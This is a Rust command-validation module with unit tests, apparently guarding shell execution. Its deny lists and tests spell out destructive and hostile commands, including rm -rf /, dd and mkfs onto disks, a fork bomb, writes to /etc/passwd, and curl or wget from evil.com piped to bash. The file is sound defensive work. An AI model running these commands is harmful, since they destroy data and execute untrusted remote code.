//! Command validation for security checks
//!
//! Blocks obviously catastrophic commands while allowing normal operations.
//! This is NOT a sandbox - just a basic protection layer.

/// Validation result with reason if blocked
#[derive(Debug, Clone)]
pub struct ValidationResult {
    pub allowed: bool,
    pub reason: Option<&'static str>,
}

impl ValidationResult {
    pub fn allowed() -> Self {
        Self { allowed: true, reason: None }
    }

    pub fn blocked(reason: &'static str) -> Self {
        Self { allowed: false, reason: Some(reason) }
    }
}

/// Command validator with configurable rules
pub struct CommandValidator {
    /// Exact command prefixes that are always blocked
    banned_exact_prefixes: Vec<&'static str>,
    /// Root paths that are blocked for destructive commands
    blocked_root_paths: Vec<&'static str>,
    /// Safe absolute paths for rm -rf
    safe_rm_paths: Vec<&'static str>,
}

impl Default for CommandValidator {
    fn default() -> Self {
        Self::new()
    }
}

impl CommandValidator {
    pub fn new() -> Self {
        Self {
            banned_exact_prefixes: vec![
                // File system destruction
                "rm -rf --no-preserve-root /",
                "rm -rf --no-preserve-root /*",
                // Disk operations
                "dd if=/dev/zero of=/dev/",
                "dd if=/dev/random of=/dev/",
                "mkfs",
                "mkfs.ext4",
                "mkfs.xfs",
                // Permission escalation
                "chmod 777 /",
                "chmod -R 777 /",
                "chmod 777 /etc",
                "chmod 777 /var",
                "chown -R root:root /",
                "chown -R root:root /home",
                // System control
                ":(){:|:&};:",
                "shutdown",
                "reboot",
                "halt",
                "poweroff",
                "init 0",
                "init 6",
                // Network download + execution
                "wget | sh",
                "wget | bash",
                "curl | sh",
                "curl | bash",
                "wget | sudo",
                "curl | sudo",
            ],
            blocked_root_paths: vec![
                "rm -rf /",
                "rm -rf /*",
                "rm -rf ~",
                "rm -rf $HOME",
            ],
            safe_rm_paths: vec![
                "/tmp",
                "/var/tmp",
                "/home/",
                "~/",
            ],
        }
    }

    /// Validate a command for safety
    pub fn validate(&self, cmd: &str) -> ValidationResult {
        let norm: String = cmd.split_whitespace().collect::<Vec<_>>().join(" ");

        // Check exact banned prefixes
        for bad in &self.banned_exact_prefixes {
            if norm.starts_with(bad) {
                return ValidationResult::blocked("destructive or dangerous command blocked");
            }
        }

        // Check exact blocked root paths
        for blocked in &self.blocked_root_paths {
            if norm == blocked {
                return ValidationResult::blocked("destructive rm -rf on root path blocked");
            }
        }

        // Special handling for rm -rf
        if norm.starts_with("rm -rf ") {
            return self.validate_rm_rf(&norm);
        }

        // Check path traversal in destructive commands
        if norm.contains("..")
            && (norm.contains("rm") || norm.contains("chmod") || norm.contains("chown"))
        {
            return ValidationResult::blocked("path traversal in destructive command blocked");
        }

        // Check writing to critical system files
        if self.is_writing_to_critical_file(&norm) {
            return ValidationResult::blocked("writing to critical system files blocked");
        }

        // Check download and execute pattern
        if self.is_download_and_execute(&norm) {
            return ValidationResult::blocked("downloading and executing scripts blocked");
        }

        ValidationResult::allowed()
    }

    fn validate_rm_rf(&self, norm: &str) -> ValidationResult {
        let path = norm["rm -rf ".len()..].trim();

        // Check safe absolute paths
        for safe in &self.safe_rm_paths {
            if path.starts_with(safe) {
                return ValidationResult::allowed();
            }
        }

        // Allow relative paths without traversal
        if (path.starts_with("./") || !path.starts_with("/")) && !path.contains("..") {
            return ValidationResult::allowed();
        }

        ValidationResult::blocked("destructive rm -rf on dangerous path blocked")
    }

    fn is_writing_to_critical_file(&self, norm: &str) -> bool {
        norm.contains("> /etc/passwd")
            || norm.contains("> /etc/shadow")
            || norm.contains("> /etc/sudoers")
            || norm.contains("> /dev/sda")
            || norm.contains("> /dev/hda")
    }

    fn is_download_and_execute(&self, norm: &str) -> bool {
        (norm.contains("wget") || norm.contains("curl"))
            && (norm.contains("| sh") || norm.contains("| bash") || norm.contains("| sudo"))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blocked_commands() {
        let validator = CommandValidator::new();

        // File system destruction
        assert!(!validator.validate("rm -rf /").allowed);
        assert!(!validator.validate("rm -rf /*").allowed);
        assert!(!validator.validate("rm -rf ~").allowed);
        assert!(!validator.validate("rm -rf $HOME").allowed);

        // Disk operations
        assert!(!validator.validate("mkfs.ext4 /dev/sda").allowed);
        assert!(!validator.validate("dd if=/dev/zero of=/dev/sda").allowed);

        // Permission escalation
        assert!(!validator.validate("chmod 777 /").allowed);
        assert!(!validator.validate("chown -R root:root /").allowed);

        // System control
        assert!(!validator.validate("shutdown").allowed);
        assert!(!validator.validate("reboot").allowed);

        // Network download + execution
        assert!(!validator.validate("wget http://evil.com/script.sh | sh").allowed);
        assert!(!validator.validate("curl http://evil.com/script.sh | bash").allowed);
    }

    #[test]
    fn test_allowed_commands() {
        let validator = CommandValidator::new();

        assert!(validator.validate("ls -la").allowed);
        assert!(validator.validate("git status").allowed);
        assert!(validator.validate("cargo build").allowed);
        assert!(validator.validate("npm install").allowed);

        // Safe rm -rf paths
        assert!(validator.validate("rm -rf /tmp/test").allowed);
        assert!(validator.validate("rm -rf ./build").allowed);
        assert!(validator.validate("rm -rf ~/project/build").allowed);

        // Safe chmod
        assert!(validator.validate("chmod 755 script.sh").allowed);
        assert!(validator.validate("chmod 644 config.json").allowed);
    }

    #[test]
    fn test_path_traversal_blocking() {
        let validator = CommandValidator::new();

        assert!(!validator.validate("rm -rf ../..").allowed);
        assert!(!validator.validate("chmod 777 ../../../etc").allowed);

        // Path traversal in safe commands should pass
        assert!(validator.validate("cat ../../README.md").allowed);
        assert!(validator.validate("ls ../../../").allowed);
    }

    #[test]
    fn test_critical_file_protection() {
        let validator = CommandValidator::new();

        assert!(!validator.validate("echo test > /etc/passwd").allowed);
        assert!(!validator.validate("echo test > /etc/shadow").allowed);
        assert!(!validator.validate("echo test > /dev/sda").allowed);

        assert!(validator.validate("echo test > output.txt").allowed);
    }

    #[test]
    fn test_command_normalization() {
        let validator = CommandValidator::new();

        // Extra spaces should be handled
        assert!(!validator.validate("rm   -rf   /").allowed);
        assert!(!validator.validate("chmod   777   /").allowed);
    }
}